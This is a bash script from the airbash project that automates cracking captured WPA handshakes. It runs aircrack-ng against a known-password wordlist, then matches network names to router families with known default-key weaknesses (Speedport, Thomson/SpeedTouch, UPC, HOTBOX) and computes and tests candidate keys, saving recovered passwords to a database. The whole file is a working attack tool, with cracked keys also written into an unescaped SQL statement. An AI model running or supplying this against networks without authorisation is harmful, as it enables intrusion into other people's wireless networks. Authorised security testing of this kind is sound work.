# This script is part of airbash (https://github.com/tehw0lf/airbash)
# Written by tehw0lf
# Execution of this script will search the handshake database for entries
# that have not been cracked yet and then try to match the SSID with
# routers that have known vulnerabilities. Subsequently, the default
# passwords for any found matches are calculated and tested using aircrack-ng (https://aircrack-ng.org)

AIRCRACK_BIN=$(which aircrack-ng)
SQLITE3_BIN=$(which sqlite3)

# configure path and file names
export PATH="$PATH:modules:bin"
working_directory=$(realpath .)
handshake_directory="$working_directory/.handshakes"
wordlist_directory="$working_directory/.wordlists"
database_file=".database.sqlite3"
IFS=$'\n'
for handshake_data in $("$SQLITE3_BIN" "$working_directory/$database_file" "SELECT * FROM handshakes WHERE psk IS NULL AND processed IS NULL" 2>/dev/null); do
  unset IFS
  # get ssids for current handshake
  bssid=$(echo "$handshake_data" | awk -F '|' '{print $4}')
  essid=$(echo "$handshake_data" | awk -F '|' '{print $5}')

  # check against list of known passwords
  psk=$("$AIRCRACK_BIN" "$handshake_directory/$bssid"*.cap -w "$wordlist_directory"known_passwords 2>/dev/null | grep FOUND | sort -u | awk '{print $4}')
  if [ ${#psk} -gt 7 ]; then
    echo "Key found for BSSID $bssid: $psk"
    "$SQLITE3_BIN" "$working_directory/$database_file" "UPDATE handshakes SET psk='$psk', processed=1 WHERE bssid='$bssid';" 2>/dev/null
    mv "$handshake_directory/$bssid"* "$handshake_directory".cracked/ 2>/dev/null
    continue
  fi

  # modules
  # Speedport 500/700
  if [[ $(echo $essid | grep -c -oE 'WLAN-[0-9A-F]{4}[0-9]{2}') -gt 0 ]]; then
    echo "Speedport 500/700 detected, computing default keys (1000 keys)"
    . sp5700.sh

  # Thomson
  elif [[ $(echo $essid | grep -c -oE 'Thomson[0-9a-zA-Z]{6}') -gt 0 ]]; then
    tessid=${essid#Thomson}
    echo "Thomson/SpeedTouch detected, computing default keys for production dates between 2005 and 2009"
    . st.sh
  # SpeedTouch
  elif [[ $(echo $essid | grep -c -oE 'SpeedTouch[0-9a-zA-Z]{6}') -gt 0 ]]; then
    tessid=${essid#SpeedTouch}
    echo "SpeedTouch detected, computing default keys for production dates between 2005 and 2009"
    . st.sh

  # UPC 7 digits
  elif [[ $(echo $essid | grep -c -oE 'UPC[0-9]{7}') -gt 0 ]]; then
    echo "UPC detected, computing default keys"
    . upc7d.sh

  # HOTBOX
  elif [[ `echo $essid | grep -c -oE 'HOTBOX-'` -gt 0  ]]; then
    echo "HOTBOX detected, computing default keys"
    . hotbox.sh
  
  # template for module creation
    #	elif [[ `echo $essid | grep -c -oE 'SSIDSTYLE'` -gt 0  ]]; then
    #		echo "Template detected, computing default keys"
    #		. template.sh
  fi
done

rm -f "$handshake_directory/".cracked/*.cap 2>/dev/null
